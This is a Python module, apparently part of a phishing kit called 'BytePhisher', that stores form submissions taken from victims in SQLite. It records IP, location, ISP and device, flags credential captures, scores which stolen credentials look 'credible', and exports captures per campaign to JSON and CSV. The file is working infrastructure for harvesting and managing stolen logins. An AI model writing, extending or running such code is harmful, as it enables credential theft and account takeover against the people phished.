# BytePhisher — SQLite capture store.
#
# Tables:
#   captures (every form submission, tagged with its campaign)
#   visitors (de-duplicated by ip+ua, so "unique visitors" is truthful)
#
# Thread-safe: the HTTP server is threaded and shares one connection, so every
# write path takes a lock and the DB runs in WAL mode.
import sqlite3
import os
import time
import json
import threading

class CaptureDB:
    def __init__(self, db_path):
        d = os.path.dirname(db_path)
        if d:
            os.makedirs(d, exist_ok=True)
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        # The HTTP server is threaded: serialize writes on one connection.
        self._lock = threading.Lock()
        self.conn.executescript("""
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts REAL,
            source_url TEXT,
            ip TEXT,
            city TEXT,
            country TEXT,
            isp TEXT,
            ua TEXT,
            device TEXT,
            fields_json TEXT,
            is_cred INTEGER DEFAULT 0,
            campaign TEXT
        );
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            ua TEXT,
            first_seen REAL,
            hits INTEGER DEFAULT 1
        );
        """)
        # Visitor de-duplication depends on a UNIQUE(ip, ua) index: without it
        # every page view inserted a new row and "unique visitors" was wrong.
        try:
            self.conn.execute(
                "CREATE UNIQUE INDEX IF NOT EXISTS idx_visitors_ip_ua ON visitors(ip, ua)")
        except sqlite3.IntegrityError:
            # legacy DB that already accumulated duplicates — collapse then retry
            self.conn.execute("""DELETE FROM visitors WHERE id NOT IN
                                 (SELECT MIN(id) FROM visitors GROUP BY ip, ua)""")
            self.conn.execute(
                "CREATE UNIQUE INDEX IF NOT EXISTS idx_visitors_ip_ua ON visitors(ip, ua)")
        # Migration: DBs created before campaign/risk support get the columns.
        self._ensure_column("captures", "campaign", "TEXT")
        self._ensure_column("captures", "risk", "INTEGER DEFAULT 0")
        self._ensure_column("captures", "risk_reasons", "TEXT")
        self.conn.commit()

    def _ensure_column(self, table, column, decl):
        cols = [r[1] for r in self.conn.execute(f"PRAGMA table_info({table})")]
        if column not in cols:
            self.conn.execute(f"ALTER TABLE {table} ADD COLUMN {column} {decl}")

    def _upsert_visitor(self, ip, ua):
        self.conn.execute(
            "INSERT INTO visitors (ip, ua, first_seen, hits) VALUES (?,?,?,1) "
            "ON CONFLICT(ip, ua) DO UPDATE SET hits = hits + 1",
            (ip or "unknown", ua or "unknown", time.time()))

    def log_visit(self, ip, ua):
        """Page view (no credentials) — keeps visitor stats meaningful."""
        with self._lock:
            self._upsert_visitor(ip, ua)
            self.conn.commit()

    def record(self, source_url, ip, city, country, isp, ua, device, fields, is_cred,
               campaign=None, risk=0, risk_reasons=None):
        with self._lock:
            self.conn.execute(
                "INSERT INTO captures (ts, source_url, ip, city, country, isp, ua, device,"
                " fields_json, is_cred, campaign, risk, risk_reasons)"
                " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (time.time(), source_url, ip, city or "", country or "", isp or "",
                 ua, device, json.dumps(fields, default=str), 1 if is_cred else 0,
                 campaign or "", int(risk or 0),
                 json.dumps(risk_reasons or [], default=str)))
            self._upsert_visitor(ip, ua)
            self.conn.commit()

    def all(self, limit=200, campaign=None):
        cols = ("ts, source_url, ip, city, country, isp, ua, device, fields_json,"
                " is_cred, campaign, risk, risk_reasons")
        if campaign:
            rows = self.conn.execute(
                f"SELECT {cols} FROM captures WHERE campaign=? ORDER BY id DESC LIMIT ?",
                (campaign, limit)).fetchall()
        else:
            rows = self.conn.execute(
                f"SELECT {cols} FROM captures ORDER BY id DESC LIMIT ?",
                (limit,)).fetchall()
        out = []
        for r in rows:
            try:
                reasons = json.loads(r[12]) if r[12] else []
            except Exception:
                reasons = []
            out.append({
                "ts": r[0], "source_url": r[1], "ip": r[2], "city": r[3],
                "country": r[4], "isp": r[5], "ua": r[6], "device": r[7],
                "fields": json.loads(r[8]) if r[8] else {},
                "is_cred": bool(r[9]), "campaign": r[10] or "",
                "risk": int(r[11] or 0), "risk_reasons": reasons,
            })
        return out

    def stats(self, campaign=None):
        where = " WHERE campaign=?" if campaign else ""
        args = (campaign,) if campaign else ()
        total = self.conn.execute(f"SELECT COUNT(*) FROM captures{where}", args).fetchone()[0]
        creds = self.conn.execute(
            f"SELECT COUNT(*) FROM captures{where}{' AND' if campaign else ' WHERE'} is_cred=1",
            args).fetchone()[0]
        # "credible" = credential capture from a low-risk (human-looking) source
        credible = self.conn.execute(
            f"SELECT COUNT(*) FROM captures{where}{' AND' if campaign else ' WHERE'}"
            " is_cred=1 AND risk < 30", args).fetchone()[0]
        visitors = self.conn.execute("SELECT COUNT(*) FROM visitors").fetchone()[0]
        return {"total_captures": total, "credentials": creds, "visitors": visitors,
                "credible_credentials": credible}

    def campaigns(self):
        """Per-campaign breakdown for the dashboard / reporting."""
        rows = self.conn.execute(
            "SELECT COALESCE(NULLIF(campaign,''), '(untagged)') c, COUNT(*),"
            " SUM(is_cred) FROM captures GROUP BY c ORDER BY COUNT(*) DESC").fetchall()
        return [{"campaign": r[0], "captures": r[1], "credentials": r[2] or 0} for r in rows]

    def export_json(self, path, campaign=None):
        """Machine-readable dump (same shape as the API) for downstream tooling."""
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"exported_at": time.time(),
                       "stats": self.stats(campaign=campaign),
                       "campaigns": self.campaigns(),
                       "captures": self.all(limit=1000000, campaign=campaign)},
                      f, indent=2, default=str)
        return path

    def export_csv(self, path, campaign=None):
        import csv
        with open(path, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["ts", "campaign", "source_url", "ip", "city", "country",
                        "isp", "device", "is_cred", "risk", "risk_reasons", "fields"])
            for c in self.all(limit=1000000, campaign=campaign):
                w.writerow([
                    c["ts"], c["campaign"], c["source_url"], c["ip"], c["city"],
                    c["country"], c["isp"], c["device"],
                    "YES" if c["is_cred"] else "NO",
                    c["risk"], "; ".join(c["risk_reasons"]),
                    "; ".join(f"{k}={v}" for k, v in c["fields"].items())
                ])
        return path

    def close(self):
        self.conn.close()
